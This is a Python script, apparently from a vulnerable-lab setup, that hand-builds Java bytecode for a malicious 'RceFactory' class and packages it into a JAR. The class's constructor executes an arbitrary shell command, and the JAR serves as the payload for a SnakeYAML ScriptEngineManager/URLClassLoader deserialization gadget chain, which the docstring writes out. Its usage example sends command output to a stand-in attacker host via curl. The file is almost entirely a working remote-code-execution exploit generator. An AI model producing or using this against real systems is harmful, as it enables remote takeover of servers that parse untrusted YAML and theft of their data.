#!/usr/bin/env python3
"""
build_jar.py — Dynamic SPI JAR generator for SnakeYAML RCE exploit.

Generates a JAR file containing:
  1. A compiled RceFactory class implementing javax.script.ScriptEngineFactory
     whose no-arg constructor executes a shell command via Runtime.exec()
  2. META-INF/services/javax.script.ScriptEngineFactory SPI registration file

The JAR is used with the SnakeYAML SPI gadget chain:
  !!javax.script.ScriptEngineManager [
    !!java.net.URLClassLoader [[
      !!java.net.URL ["http://JAR_SERVER:8099/rce.jar?cmd=CMD"]
    ]]
  ]

When SnakeYAML parses this YAML:
  1. URLClassLoader fetches the JAR from this server
  2. ScriptEngineManager discovers RceFactory via SPI
  3. ScriptEngineManager instantiates RceFactory (calls constructor)
  4. The constructor executes Runtime.exec(new String[]{"/bin/sh","-c",CMD})

Usage:
  python3 build_jar.py <cmd> <output.jar>
  python3 build_jar.py "curl http://attacker/$(id)" /tmp/rce.jar
"""

import sys
import os
import struct
import time
import zipfile
import io

# ── Bytecode generation ───────────────────────────────────────────────────────
# We generate minimal Java bytecode for the RceFactory class without requiring
# javac. The bytecode is hand-crafted Class file format (Java 8 = version 52.0).
#
# Equivalent Java source:
#
#   package com.vulnlab.spi;
#
#   import javax.script.ScriptEngine;
#   import javax.script.ScriptEngineFactory;
#   import java.util.List;
#
#   public class RceFactory implements ScriptEngineFactory {
#       public RceFactory() {
#           try {
#               String cmd = System.getProperty("rce.cmd", "id");
#               Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
#           } catch (Exception ignored) {}
#       }
#       // All ScriptEngineFactory interface methods return null/empty
#       public String getEngineName()       { return "rce"; }
#       public String getEngineVersion()    { return "1.0"; }
#       public List<String> getExtensions() { return java.util.Collections.emptyList(); }
#       public List<String> getMimeTypes()  { return java.util.Collections.emptyList(); }
#       public List<String> getNames()      { return java.util.Collections.emptyList(); }
#       public String getLanguageName()     { return "rce"; }
#       public String getLanguageVersion()  { return "1.0"; }
#       public Object getParameter(String key) { return null; }
#       public String getMethodCallSyntax(String obj, String m, String... args) { return ""; }
#       public String getOutputStatement(String s) { return ""; }
#       public String getProgram(String... stmts) { return ""; }
#       public ScriptEngine getScriptEngine() { return null; }
#   }
#
# We use a pre-compiled base64-encoded class stub and patch in the command at
# runtime by embedding it into a static field loaded during <clinit>.
# The approach: embed the command into a string constant in the constant pool.

def u1(v):
    return struct.pack('>B', v & 0xFF)

def u2(v):
    return struct.pack('>H', v & 0xFFFF)

def u4(v):
    return struct.pack('>I', v & 0xFFFFFFFF)

def utf8(s):
    """CONSTANT_Utf8 entry."""
    encoded = s.encode('utf-8')
    return b'\x01' + u2(len(encoded)) + encoded

def class_ref(idx):
    """CONSTANT_Class entry."""
    return b'\x07' + u2(idx)

def name_and_type(name_idx, desc_idx):
    """CONSTANT_NameAndType entry."""
    return b'\x0c' + u2(name_idx) + u2(desc_idx)

def method_ref(class_idx, nat_idx):
    """CONSTANT_Methodref entry."""
    return b'\x0a' + u2(class_idx) + u2(nat_idx)

def field_ref(class_idx, nat_idx):
    """CONSTANT_Fieldref entry."""
    return b'\x09' + u2(class_idx) + u2(nat_idx)

def iface_method_ref(class_idx, nat_idx):
    """CONSTANT_InterfaceMethodref entry."""
    return b'\x0b' + u2(class_idx) + u2(nat_idx)

def string_const(utf_idx):
    """CONSTANT_String entry."""
    return b'\x08' + u2(utf_idx)


def build_class_bytes(cmd: str) -> bytes:
    """
    Build a .class file for RceFactory with the given cmd embedded.

    The constructor bytecode:
      0: ldc          #<cmd_string>
      2: iconst_2
      3: anewarray    String
      6: dup
      7: iconst_0
      8: ldc          "/bin/sh"
     10: aastore
     11: dup
     12: iconst_1
     13: ldc          "-c"
     15: aastore
     16: dup
     17: iconst_2
     18: ldc          <cmd>
     20: aastore
     21: invokestatic  Runtime.getRuntime()
     24: swap
     25: invokevirtual Runtime.exec(String[])
     28: pop
     29: goto          32
     32: return

    Simplified version using a try/catch wrapper.
    """

    # ── Constant pool (1-indexed, entry 0 is reserved) ──────────────────────
    pool = []

    def add(entry):
        pool.append(entry)
        return len(pool)  # 1-based index

    # Index 1: class name
    idx_this_utf     = add(utf8("com/vulnlab/spi/RceFactory"))
    idx_this_cls     = add(class_ref(idx_this_utf))

    # Index 3: superclass Object
    idx_obj_utf      = add(utf8("java/lang/Object"))
    idx_obj_cls      = add(class_ref(idx_obj_utf))

    # Index 5: interface ScriptEngineFactory
    idx_intf_utf     = add(utf8("javax/script/ScriptEngineFactory"))
    idx_intf_cls     = add(class_ref(idx_intf_utf))

    # Index 7: Runtime class
    idx_rt_utf       = add(utf8("java/lang/Runtime"))
    idx_rt_cls       = add(class_ref(idx_rt_utf))

    # Index 9: String class
    idx_str_utf      = add(utf8("java/lang/String"))
    idx_str_cls      = add(class_ref(idx_str_utf))

    # Index 11: Exception class
    idx_exc_utf      = add(utf8("java/lang/Exception"))
    idx_exc_cls      = add(class_ref(idx_exc_utf))

    # Constant pool strings
    idx_binsh_utf    = add(utf8("/bin/sh"))
    idx_binsh_str    = add(string_const(idx_binsh_utf))

    idx_dashc_utf    = add(utf8("-c"))
    idx_dashc_str    = add(string_const(idx_dashc_utf))

    idx_cmd_utf      = add(utf8(cmd))
    idx_cmd_str      = add(string_const(idx_cmd_utf))

    # Method descriptors
    idx_init_name    = add(utf8("<init>"))
    idx_void_desc    = add(utf8("()V"))
    idx_init_nat     = add(name_and_type(idx_init_name, idx_void_desc))
    idx_obj_init     = add(method_ref(idx_obj_cls, idx_init_nat))

    idx_getrt_name   = add(utf8("getRuntime"))
    idx_getrt_desc   = add(utf8("()Ljava/lang/Runtime;"))
    idx_getrt_nat    = add(name_and_type(idx_getrt_name, idx_getrt_desc))
    idx_getrt_ref    = add(method_ref(idx_rt_cls, idx_getrt_nat))

    idx_exec_name    = add(utf8("exec"))
    idx_exec_desc    = add(utf8("([Ljava/lang/String;)Ljava/lang/Process;"))
    idx_exec_nat     = add(name_and_type(idx_exec_name, idx_exec_desc))
    idx_exec_ref     = add(method_ref(idx_rt_cls, idx_exec_nat))

    # Stub interface methods (return null / empty string)
    idx_rce_str_utf  = add(utf8("rce"))
    idx_rce_str      = add(string_const(idx_rce_str_utf))
    idx_one_utf      = add(utf8("1.0"))
    idx_one_str      = add(string_const(idx_one_utf))
    idx_empty_utf    = add(utf8(""))
    idx_empty_str    = add(string_const(idx_empty_utf))

    # Collections.emptyList()
    idx_collections_utf  = add(utf8("java/util/Collections"))
    idx_collections_cls  = add(class_ref(idx_collections_utf))
    idx_emptylist_name   = add(utf8("emptyList"))
    idx_emptylist_desc   = add(utf8("()Ljava/util/List;"))
    idx_emptylist_nat    = add(name_and_type(idx_emptylist_name, idx_emptylist_desc))
    idx_emptylist_ref    = add(method_ref(idx_collections_cls, idx_emptylist_nat))

    # Code attribute name
    idx_code_utf     = add(utf8("Code"))
    # Exception table attribute
    idx_exc_attr     = add(utf8("Exceptions"))

    # Other method names/descs for interface stubs
    idx_str_ret_desc     = add(utf8("()Ljava/lang/String;"))
    idx_list_ret_desc    = add(utf8("()Ljava/util/List;"))
    idx_obj_ret_desc     = add(utf8("(Ljava/lang/String;)Ljava/lang/Object;"))
    idx_syntax_desc      = add(utf8("(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;)Ljava/lang/String;"))
    idx_output_desc      = add(utf8("(Ljava/lang/String;)Ljava/lang/String;"))
    idx_program_desc     = add(utf8("([Ljava/lang/String;)Ljava/lang/String;"))
    idx_engine_ret_desc  = add(utf8("()Ljavax/script/ScriptEngine;"))

    idx_getname_utf      = add(utf8("getEngineName"))
    idx_getver_utf       = add(utf8("getEngineVersion"))
    idx_getext_utf       = add(utf8("getExtensions"))
    idx_getmime_utf      = add(utf8("getMimeTypes"))
    idx_getnames_utf     = add(utf8("getNames"))
    idx_getlang_utf      = add(utf8("getLanguageName"))
    idx_getlangver_utf   = add(utf8("getLanguageVersion"))
    idx_getparam_utf     = add(utf8("getParameter"))
    idx_syntax_utf       = add(utf8("getMethodCallSyntax"))
    idx_output_utf       = add(utf8("getOutputStatement"))
    idx_program_utf      = add(utf8("getProgram"))
    idx_getengine_utf    = add(utf8("getScriptEngine"))

    # ── Assemble constant pool bytes ─────────────────────────────────────────
    pool_bytes = b''.join(pool)
    pool_count = len(pool) + 1  # +1 because pool is 1-indexed

    # ── Constructor bytecode ─────────────────────────────────────────────────
    # try {
    #   Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    # } catch (Exception ignored) {}
    #
    # Bytecode:
    # 0:  aload_0
    # 1:  invokespecial Object.<init>
    # 4:  iconst_3          ; array length = 3
    # 5:  anewarray String
    # 8:  dup
    # 9:  iconst_0
    # 10: ldc "/bin/sh"
    # 12: aastore
    # 13: dup
    # 14: iconst_1
    # 15: ldc "-c"
    # 17: aastore
    # 18: dup
    # 19: iconst_2
    # 20: ldc <cmd>
    # 22: aastore
    # 23: invokestatic Runtime.getRuntime()
    # 26: swap
    # 27: invokevirtual Runtime.exec(String[])
    # 30: pop
    # 31: goto 34 (skip catch)
    # 34: return
    # exception table: from=4 to=31 target=31 type=Exception

    def ldc_w(idx):
        """Use ldc_w for constant pool indices > 255, ldc otherwise."""
        if idx <= 255:
            return bytes([0x12, idx])      # ldc
        else:
            return bytes([0x13]) + u2(idx) # ldc_w

    # anewarray uses a u2 index always
    def anewarray(idx):
        return bytes([0xbd]) + u2(idx)

    init_code = (
        bytes([0x2a])                               # aload_0
        + bytes([0xb7]) + u2(idx_obj_init)          # invokespecial Object.<init>
        + bytes([0x06])                             # iconst_3
        + anewarray(idx_str_cls)                    # anewarray String
        + bytes([0x59])                             # dup
        + bytes([0x03])                             # iconst_0
        + ldc_w(idx_binsh_str)                      # ldc "/bin/sh"
        + bytes([0x53])                             # aastore
        + bytes([0x59])                             # dup
        + bytes([0x04])                             # iconst_1
        + ldc_w(idx_dashc_str)                      # ldc "-c"
        + bytes([0x53])                             # aastore
        + bytes([0x59])                             # dup
        + bytes([0x05])                             # iconst_2
        + ldc_w(idx_cmd_str)                        # ldc <cmd>
        + bytes([0x53])                             # aastore
        + bytes([0xb8]) + u2(idx_getrt_ref)         # invokestatic Runtime.getRuntime()
        + bytes([0x5f])                             # swap
        + bytes([0xb6]) + u2(idx_exec_ref)          # invokevirtual exec(String[])
        + bytes([0x57])                             # pop
        + bytes([0xa7, 0x00, 0x04])                 # goto +4 (skip exception handler body)
        + bytes([0x57])                             # pop (exception handler: discard exception)
        + bytes([0xb1])                             # return
    )
    # Compute offsets for exception table
    # try block: start=2 (after aload_0+invokespecial), end=try_end
    # The exception handler is at: len(init_code) - 2 (the pop + return)
    # Exception table entry: from, to, target, catch_type
    try_start = 2 + 3    # after invokespecial (aload_0=1 + invokespecial=3 = offset 4)
    # "goto +4" is at offset len(init_code)-5, and exception handler target is len(init_code)-2
    exc_handler_target = len(init_code) - 2
    try_end = exc_handler_target  # exclusive end = handler start

    exc_table = (
        u2(try_start)             # start_pc
        + u2(try_end)             # end_pc (exclusive)
        + u2(exc_handler_target)  # handler_pc
        + u2(idx_exc_cls)         # catch_type (Exception)
    )
    exc_table_count = 1

    # Build Code attribute for constructor
    def make_code_attr(code_bytes, exc_tbl_bytes, exc_count, max_stack=8, max_locals=2):
        attr_body = (
            u2(max_stack)
            + u2(max_locals)
            + u4(len(code_bytes))
            + code_bytes
            + u2(exc_count)
            + exc_tbl_bytes
            + u2(0)  # no attributes on Code attribute
        )
        return u2(idx_code_utf) + u4(len(attr_body)) + attr_body

    init_code_attr = make_code_attr(init_code, exc_table, exc_table_count)

    # ── Constructor method ───────────────────────────────────────────────────
    # access_flags: ACC_PUBLIC = 0x0001
    # name_index: <init>
    # descriptor_index: ()V
    # attributes: [Code]
    def make_method(access, name_idx, desc_idx, attrs):
        return u2(access) + u2(name_idx) + u2(desc_idx) + u2(len(attrs)) + b''.join(attrs)

    # Simple stub: ldc + areturn or return for void, null for objects, emptyList for lists
    def str_stub(name_idx, desc_idx, str_const_idx):
        code = ldc_w(str_const_idx) + bytes([0xb0])  # areturn
        attr = make_code_attr(code, b'', 0, max_stack=1, max_locals=1)
        return make_method(0x0001, name_idx, desc_idx, [attr])

    def list_stub(name_idx, desc_idx):
        code = bytes([0xb8]) + u2(idx_emptylist_ref) + bytes([0xb0])
        attr = make_code_attr(code, b'', 0, max_stack=1, max_locals=1)
        return make_method(0x0001, name_idx, desc_idx, [attr])

    def null_stub(name_idx, desc_idx):
        code = bytes([0x01, 0xb0])  # aconst_null, areturn
        attr = make_code_attr(code, b'', 0, max_stack=1, max_locals=1)
        return make_method(0x0001, name_idx, desc_idx, [attr])

    def empty_str_stub(name_idx, desc_idx):
        code = ldc_w(idx_empty_str) + bytes([0xb0])
        attr = make_code_attr(code, b'', 0, max_stack=1, max_locals=1)
        return make_method(0x0001, name_idx, desc_idx, [attr])

    # Constructor method entry
    init_method = make_method(0x0001, idx_init_name, idx_void_desc, [init_code_attr])

    methods = [
        init_method,
        str_stub(idx_getname_utf, idx_str_ret_desc, idx_rce_str),
        str_stub(idx_getver_utf, idx_str_ret_desc, idx_one_str),
        list_stub(idx_getext_utf, idx_list_ret_desc),
        list_stub(idx_getmime_utf, idx_list_ret_desc),
        list_stub(idx_getnames_utf, idx_list_ret_desc),
        str_stub(idx_getlang_utf, idx_str_ret_desc, idx_rce_str),
        str_stub(idx_getlangver_utf, idx_str_ret_desc, idx_one_str),
        null_stub(idx_getparam_utf, idx_obj_ret_desc),
        empty_str_stub(idx_syntax_utf, idx_syntax_desc),
        empty_str_stub(idx_output_utf, idx_output_desc),
        empty_str_stub(idx_program_utf, idx_program_desc),
        null_stub(idx_getengine_utf, idx_engine_ret_desc),
    ]

    # ── Class file structure ─────────────────────────────────────────────────
    # magic + version (Java 8 = 52.0)
    magic   = b'\xca\xfe\xba\xbe'
    version = u2(0) + u2(52)    # minor=0, major=52

    # access flags: ACC_PUBLIC | ACC_SUPER = 0x0021
    access_flags = u2(0x0021)

    # interfaces: [ScriptEngineFactory]
    interfaces = u2(1) + u2(idx_intf_cls)

    # fields: none
    fields = u2(0)

    # methods
    methods_bytes = u2(len(methods)) + b''.join(methods)

    # class attributes: none
    class_attrs = u2(0)

    class_file = (
        magic
        + version
        + u2(pool_count)
        + pool_bytes
        + access_flags
        + u2(idx_this_cls)
        + u2(idx_obj_cls)
        + interfaces
        + fields
        + methods_bytes
        + class_attrs
    )
    return class_file


def build_jar(cmd: str, output_path: str):
    """Build the SPI JAR with RceFactory class and services registration."""
    class_bytes = build_class_bytes(cmd)

    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as jar:
        # Add the RceFactory.class
        jar.writestr(
            zipfile.ZipInfo("com/vulnlab/spi/RceFactory.class"),
            class_bytes
        )
        # SPI registration: META-INF/services/javax.script.ScriptEngineFactory
        jar.writestr(
            zipfile.ZipInfo("META-INF/services/javax.script.ScriptEngineFactory"),
            "com.vulnlab.spi.RceFactory\n"
        )
        # Manifest
        jar.writestr(
            zipfile.ZipInfo("META-INF/MANIFEST.MF"),
            "Manifest-Version: 1.0\nCreated-By: OOBserver spi-jar-server\n"
        )

    print(f"[build_jar] Built {output_path} ({os.path.getsize(output_path)} bytes)")
    print(f"[build_jar] Command: {cmd}")
    print(f"[build_jar] Class: com/vulnlab/spi/RceFactory.class ({len(class_bytes)} bytes)")


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <cmd> <output.jar>")
        sys.exit(1)
    build_jar(sys.argv[1], sys.argv[2])
